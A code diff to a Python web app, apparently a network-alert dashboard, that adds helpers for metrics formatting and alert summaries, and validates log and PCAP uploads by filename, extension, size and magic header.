+    parts = [f'{key}="{_escape_label(value)}"' for key, value in sorted(labels.items())]
+    return "{" + ",".join(parts) + "}"
+
+
+def _escape_label(value: str) -> str:
+    return str(value).replace("\\", "\\\\").replace("\n", "\\n").replace('"', '\\"')
+
+
+def _format_metric_value(value: float) -> str:
+    return str(int(value)) if float(value).is_integer() else f"{value:.6f}"
+
+
+def _count_matching_files(directory: Path, suffixes: set[str]) -> int:
+    if not directory.exists():
+        return 0
+    return sum(1 for path in directory.iterdir() if path.is_file() and path.suffix.lower() in suffixes)
+
+
+def _ui_summary() -> dict[str, object]:
+    store = AlertStore(ALERT_DB)
+    metrics = store.metrics_summary()
+    report_dir = Path(CONFIG["paths"]["report_dir"])
+    incoming_dir = Path(CONFIG.get("live", {}).get("incoming_dir", "data/live/incoming"))
+    index_health = _nova_index_health()
+    return {
+        "nova_status": index_health["status"],
+        "report_count": _count_matching_files(report_dir, {".md"}),
+        "live_queue": _count_matching_files(incoming_dir, {".pcap", ".pcapng"}),
+        "alert_count": metrics.get("alerts_total", 0),
+        "high_alerts": sum(metrics.get("alerts_by_severity", {}).get(item, 0) for item in ("critical", "high")),
+    }
+
+
+def _path_health(path: str | Path, expect_file: bool = False) -> dict[str, object]:
+    target = Path(path)
+    exists = target.is_file() if expect_file else target.exists()
+    return {"path": str(target), "exists": exists}
+
+
+def _validate_upload(upload, allowed_extensions: set[str], require_pcap_magic: bool = False) -> str | None:
+    filename = secure_filename(upload.filename or "")
+    if not filename:
+        return "Upload filename is required."
+    suffix = Path(filename).suffix.lower()
+    if suffix not in allowed_extensions:
+        return f"Unsupported upload file type: {suffix or '(none)'}."
+    size = _upload_size(upload)
+    if size > MAX_UPLOAD_BYTES:
+        return f"Upload exceeds {WEB_CONFIG.get('max_upload_mb', 50)} MB limit."
+    if require_pcap_magic and not _has_pcap_magic(upload):
+        return "Uploaded PCAP failed magic header validation."
+    return None
+
+
+def _upload_size(upload) -> int:
+    stream = upload.stream
+    position = stream.tell()
+    stream.seek(0, os.SEEK_END)
+    size = stream.tell()
+    stream.seek(position)
+    return size
+
+
+def _has_pcap_magic(upload) -> bool:
+    stream = upload.stream
+    position = stream.tell()
+    stream.seek(0)
+    header = stream.read(4)
+    stream.seek(position)
+    return header in PCAP_MAGIC_PREFIXES
+
+
+def _rewind_upload(upload) -> None:
+    upload.stream.seek(0)
+
+
 def _recent_reports(limit: int = 12, query: str = "") -> list[dict[str, str]]:
     report_dir = Path(CONFIG["paths"]["report_dir"])
     if not report_dir.exists():
@@ -612,19 +441,23 @@ def _recent_reports(limit: int = 12, query: str = "") -> list[dict[str, str]]:
     return items
 
 
-def _save_optional_logs() -> dict[str, list[str]]:
-    saved = {"access_log": [], "dns_log": [], "endpoint_log": []}
+def _save_optional_logs() -> tuple[dict[str, list[str]], str | None]:
+    saved = {"access_log": [], "dns_log": [], "endpoint_log": [], "app_log": []}
     upload_dir = Path(CONFIG["paths"]["csv_dir"]) / "uploads"
     upload_dir.mkdir(parents=True, exist_ok=True)
     for field in saved:
         upload = request.files.get(field)
         if upload is None or not upload.filename:
             continue
+        error = _validate_upload(upload, ALLOWED_LOG_EXTENSIONS)
+        if error:
+            return saved, f"{field}: {error}"
         filename = secure_filename(upload.filename)
         path = upload_dir / f"{field}_{filename}"
+        _rewind_upload(upload)
         upload.save(path)
         saved[field].append(str(path))
-    return saved
+    return saved, None
 
 
 def _base_md_name(filename: str) -> str:
